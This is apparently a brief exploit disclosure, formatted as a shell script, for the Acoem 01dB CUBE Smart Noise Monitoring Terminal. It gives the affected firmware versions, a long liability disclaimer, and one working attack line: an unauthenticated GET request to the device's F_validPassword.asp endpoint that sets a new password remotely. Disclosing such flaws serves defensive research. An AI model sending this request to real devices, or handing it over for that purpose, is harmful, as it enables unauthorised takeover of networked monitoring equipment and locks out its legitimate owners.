#!/bin/sh
# 
#  Acoem 01dB CUBE Smart Noise Monitoring Terminal
#  Remote Password Change
#  
#  HW version:       LIS001A
#  Application FW:   2.34
#  Metrology FW:     2.10
#  Modem FW:         12.00.005 / 08.01.108
# 
#
#  Copyright 2016 (c) Todor Donev 
#  <todor.donev at gmail.com>
#  https://www.ethical-hacker.org/
#  https://www.facebook.com/ethicalhackerorg
#
#  Disclaimer:
#  This or previous programs is for Educational 
#  purpose ONLY. Do not use it without permission. 
#  The usual disclaimer applies, especially the 
#  fact that Todor Donev is not liable for any 
#  damages caused by direct or indirect use of the 
#  information or functionality provided by these 
#  programs. The author or any Internet provider 
#  bears NO responsibility for content or misuse 
#  of these programs or any derivatives thereof.
#  By using these programs you accept the fact 
#  that any damage (dataloss, system crash, 
#  system compromise, etc.) caused by the use 
#  of these programs is not Todor Donev's 
#  responsibility.
#   
#  Use them at your own risk!
#
#  Thanks to Maya Hristova that support me.  

[todor@adamantium ~]$ GET "http://<TARGET>/ajax/F_validPassword.asp?NewPwd=<PASSWORD>"
